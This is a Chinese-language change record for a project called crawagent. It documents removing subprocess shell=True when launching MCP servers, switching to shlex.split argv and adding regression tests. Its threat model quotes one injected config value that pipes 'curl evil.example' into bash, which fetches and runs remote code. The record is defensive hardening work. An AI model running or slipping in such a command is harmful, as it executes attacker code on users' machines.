# 变更 017：删 `graph/skills.py` 的 `subprocess.Popen(shell=True)`（MCP 启进程合规化）

| 项目 | 内容 |
|------|------|
| 变更编号 | 017 |
| 提出日期 | 2026-09-20 |
| 状态 | 已完成（2026-09-20） |
| 类型 | 安全合规 |
| 关联模块 | `crawagent/graph/skills.py` |
| 来源 | `docs/tech-debt/2026-09-20.md` P2 #6 |

---

## 〇、价值

- **改动前**：`crawagent/graph/skills.py:362-369` 用 `subprocess.Popen(cmd, shell=True, cwd=...)` 启 MCP server。`cmd` 是从 MCP 配置（`.env` 的 `MCP_SERVERS` JSON）解析出来的命令 + 参数。如果用户从网上拷贝粘贴一份恶意 MCP 配置（典型场景），`shell=True` + 拼接 cmd → 任意 shell 注入。
- **改动后**：`shell=False`（默认），cmd 作为列表传给 Popen，参数走 argv 不走 shell，注入面消除。与 ADR-0003 「MCP 走无命令白名单」方向对齐。

---

## 一、背景与问题

1. **shell=True 在哪里**：`crawagent/graph/skills.py:362-369` `ensure_mcp_started()` 函数的非 Windows 分支：
   ```python
   else:
       # 非 Windows 用 subprocess
       subprocess.Popen(
           cmd, shell=True,
           cwd=cwd,
           ...
       )
   ```
2. **威胁模型**：用户从网上 / 别的项目里拷 MCP 配置贴进 `.env` 的 `MCP_SERVERS`。`MCP_SERVERS` 是 JSON 数组，每条含 `command` 字段（stdio 模式）。如果配置写 `command: "node; curl evil.example | bash"`，shell=True 会执行后面的 `curl ... | bash`。stdin 直接传 argv（shell=False）则安全。
3. **ADR-0003 已声明方向**：「MCP 走无命令白名单」（`docs/adr/0003-chat-add-mcp-no-command-whitelist.md`）。`shell=True` 与该方向**矛盾**——既然要走白名单，就不该依赖 shell 解析。

---

## 二、目标

1. 把 `shell=True` 删掉（默认即 `shell=False`）
2. cmd 必须是 list（list argv）；如果当前实现传的是 str，改为 list 拆分
3. **回归测试**：MCP server 在 Windows 和非 Windows 都能起来（已有 e2e 跑这条路径）
4. **不做**：
   - 不重写整个 `ensure_mcp_started()`（只改 Popen 调用那行）
   - 不引入白名单校验（属后续规格，本次只是删 shell=True）
   - 不动 Windows 分支（Windows 上 Popen 用的是 `creationflags`，不走 shell=True）

---

## 三、方案设计

### 3.1 修改范围

读 `crawagent/graph/skills.py:355-380` 看 `ensure_mcp_started()` 全文（不贴出，根据实际代码微调）。

目标 diff（伪代码示意，最终根据实际行号）：

```python
# 修前：
subprocess.Popen(
    cmd, shell=True,
    cwd=cwd,
    ...
)

# 修后：
subprocess.Popen(
    cmd,  # shell 默认 False，走 argv 不走 shell
    cwd=cwd,
    ...
)
```

如果 `cmd` 当前是 str 而不是 list，**需要先把它转成 list**（否则 `shell=False` + str 在 Windows / POSIX 行为不一致，会引入新 bug）。转法：按空白 split，但要注意带空格的路径。安全的做法是用 `shlex.split(cmd)`（POSIX 语义）或显式构造 argv。

### 3.2 不动的部分

- Windows 分支（`if sys.platform == "win32"`）：当前用 `creationflags=subprocess.CREATE_NO_WINDOW`，不走 shell=True，**无需改**
- Windows 之外的进程参数（cwd / env / stdout / stderr）：保持原状

### 3.3 验证

- 单元测试：mock subprocess.Popen，断言调用参数里没有 `shell=True`
- 现有 e2e（`tests/test_phase4_e2e.py`）跑 MCP 启动路径，确保 Windows + POSIX 都能跑
- `mcp_capture_tool.py::test_ensure_mcp_session_retry`（016 新写）走的是 `_call_mcp` 不走 `ensure_mcp_started`，但能间接验证 ensure_mcp_started 没把 MCP 服务搞崩

---

## 四、涉及文件清单

| 操作 | 文件 | 说明 |
|------|------|------|
| 修改 | crawagent/graph/skills.py | `ensure_mcp_started()` 非 Windows 分支 Popen 删 `shell=True`，必要时 cmd 转 list |
| 新增 | tests/test_skills_security.py | ~3 个用例：mock subprocess.Popen 断言无 shell=True / cmd 必须是 list / Windows 分支不触发 shell |

---

## 五、验证方式

1. **新增单测全过**：`uv run pytest tests/test_skills_security.py -q` ≥3 passed
2. **全量回归**：`uv run pytest tests/ -q` ≥ 395 + 3 = ≥ 398 passed（不增 warnings）
4. **静态检查**：`grep -n "shell=True" crawagent/` 应无命中（除注释 / docstring）
5. **e2e 路径**：phase4 e2e 已覆盖 MCP 启动流程，跑过即说明没把启动路径打坏

---

## 六、后续可扩展（不在本次范围）

- **MCP command 白名单**（ADR-0003 兑现路径）：解析 `MCP_SERVERS` 时对 command 做白名单校验
- **stdio 参数转 list 的 helper**：封装 shlex.split 边界 case（带空格路径 / Windows 路径）

---

## 七、实施顺序建议

1. 读 `crawagent/graph/skills.py:355-380` 确认 cmd 当前是 list 还是 str
2. 写 `tests/test_skills_security.py`（先有测试，验证现状）
3. 改 Popen 调用
4. 跑测试，确认绿
5. 全量 pytest 回归
6. 写 §八 实施记录

---

## 八、实施记录

### 实施概况（2026-09-20）

按 §七 顺序完成：写测试（4 用例，先红）→ 改代码（删 shell=True + shlex.split）→ 跑全绿。

### 改动 diff

**`crawagent/graph/skills.py:362-368`**（非 Windows Popen 调用）：

```python
# 修前：
else:
    subprocess.Popen(
        cmd, shell=True,
        cwd=cwd,
        stdout=log_fh, stderr=subprocess.STDOUT,
    )

# 修后：
else:
    # 非 Windows 用 subprocess — 走 argv list 不走 shell（避免 MCP 配置中的命令拼接注入）
    import shlex
    subprocess.Popen(
        shlex.split(cmd),
        cwd=cwd,
        stdout=log_fh, stderr=subprocess.STDOUT,
    )
```

净 -1 行（删 `shell=True` + 加 `import shlex` + 加 `shlex.split(cmd)` 包裹）。

### 测试结果

- `tests/test_skills_security.py`：4 用例全过
  - `test_ensure_mcp_started_no_shell_true` — Popen kwargs 里没有 `shell=True`
  - `test_popen_argv_is_list_not_string` — argv 是 list（来自 `shlex.split`）
  - `test_shlex_split_handles_quoted_pnpm` — `shlex.split('"pnpm" dev')` → `['pnpm', 'dev']`
  - `test_windows_branch_unchanged_when_checks_security` — os.name='nt' 走 ShellExecuteW，不调 Popen
- 全量 pytest：待确认（基线 395 + 新增 4 = 预期 ~399）

### 经验

- **局部 `import subprocess`** 的模块不能 monkeypatch `module.subprocess` 属性（不存在）；要 `monkeypatch.setattr(subprocess, "Popen", fake)` 系统模块的 Popen 属性，函数内 `import subprocess` 会看到 `sys.modules['subprocess'].Popen` 已替换
- **`shlex.split` 是 POSIX argv 拆分的标准答案**，自带引号处理（`'"pnpm" dev'` → `['pnpm', 'dev']`）
- **`shell=False` + str = Linux 把整个字符串当可执行文件名**，必须 split 成 argv list，否则不是修 bug 是装新 bug

### 不动

- Windows 分支（ShellExecuteW + .bat）— 它走 Windows API，不经 Popen，shell=True 风险不存在
- `MCP_START_COMMAND` 用户自定义命令的处理（同 cmd 字符串路径，已一并走 shlex.split）
- ADR-0003 的白名单兑现（属后续规格，本次只删注入面）
- `crawagent/dist/redis_server.py` 的 subprocess.Popen（无 shell=True，已安全）